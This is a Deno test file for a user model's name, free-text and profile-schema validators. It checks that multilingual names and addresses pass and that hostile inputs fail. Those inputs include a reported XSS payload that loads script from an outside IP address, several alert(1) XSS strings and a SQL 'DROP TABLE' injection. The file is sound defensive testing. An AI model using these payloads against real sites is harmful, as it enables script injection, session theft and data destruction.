import "../index.d.ts";

import { expect } from "expect";

const { PersonNameValidator, SafeTextValidator, UpdateUserSchema } =
  await import("@Models/user.ts");

const Name = PersonNameValidator();

const accepts = async (value: string) => {
  try {
    return { ok: true, out: await Name.validate(value) };
  } catch {
    return { ok: false, out: undefined };
  }
};

Deno.test("person names", async (t) => {
  await t.step("real names of several scripts are accepted", async () => {
    for (
      const name of [
        "Hatem",
        "محمد",
        "عاصم التلوع",
        "Jean-Luc",
        "O'Brien",
        "J. R. Smith",
        "Ana María",
        "李明",
        "Björn",
        "عبد الله",
      ]
    ) {
      expect((await accepts(name)).ok).toBe(true);
    }
  });

  await t.step("surrounding whitespace is trimmed, not refused", async () => {
    // An iOS keyboard appending a space must not fail a signup.
    expect((await accepts("  Hatem ")).out).toBe("Hatem");
  });

  await t.step("the reported payload is refused", async () => {
    expect(
      (await accepts("<script src=//102.209.115.152:8882/j></script>")).ok,
    ).toBe(false);
  });

  await t.step("other markup and scheme payloads are refused", async () => {
    for (
      const payload of [
        '"><img src=x onerror=alert(1)>',
        "<img src=x onerror=alert(1)>",
        "javascript:alert(1)",
        "<<SCRIPT>alert(1);//<</SCRIPT>",
        "&lt;script&gt;",
        "Robert'); DROP TABLE users;--",
        "",
        "   ",
        "123",
      ]
    ) {
      expect((await accepts(payload)).ok).toBe(false);
    }
  });
});

Deno.test("free text fields", async (t) => {
  const Text = SafeTextValidator(300);

  await t.step("real addresses are accepted", async () => {
    for (
      const value of [
        "Flat 3, 24 Omar Al-Mukhtar St.",
        "طرابلس، شارع الجمهورية 12",
        "P.O. Box 1234",
        "Building #7 (near the mosque)",
      ]
    ) {
      expect(await Text.validate(value)).toBe(value);
    }
  });

  await t.step("markup characters are refused", async () => {
    for (const value of ["<b>x</b>", 'a " b', "<script>"]) {
      await expect(Text.validate(value)).rejects.toBeDefined();
    }
  });
});

Deno.test("the profile schema refuses the payload", async () => {
  // Both the signup body and PATCH /users/me/ derive from this schema.
  await expect(
    UpdateUserSchema.validate({
      fname: "<script src=//102.209.115.152:8882/j></script>",
      lname: "X",
    }),
  ).rejects.toBeDefined();

  expect(
    await UpdateUserSchema.validate({ fname: " Hatem ", lname: "Mohamed" }),
  ).toEqual({ fname: "Hatem", lname: "Mohamed" });
});

const e = (await import("validator")).default;
const { CreateUserSchema } = await import("@Models/user.ts");

Deno.test("the schemas the routes actually build", async (t) => {
  // POST /users/:oauthAppId/
  const SignupBody = e.omit(CreateUserSchema, ["oauthApp"]);

  // PATCH /users/me/
  const UpdateBody = e.partial(UpdateUserSchema, { nullish: true });

  const signup = (fname: string) =>
    SignupBody.validate({
      username: "someone",
      password: "secret123",
      fname,
    });

  await t.step("signup refuses the payload", async () => {
    await expect(
      signup("<script src=//102.209.115.152:8882/j></script>"),
    ).rejects.toBeDefined();

    expect((await signup("Hatem")).fname).toBe("Hatem");
  });

  await t.step("the partial update refuses it too", async () => {
    // e.partial must not drop the inner rules.
    await expect(
      UpdateBody.validate({ fname: "<script>alert(1)</script>" }),
    ).rejects.toBeDefined();

    await expect(
      UpdateBody.validate({ city: "<b>Tripoli</b>" }),
    ).rejects.toBeDefined();

    expect(await UpdateBody.validate({ fname: "Hatem" })).toEqual({
      fname: "Hatem",
    });
  });
});
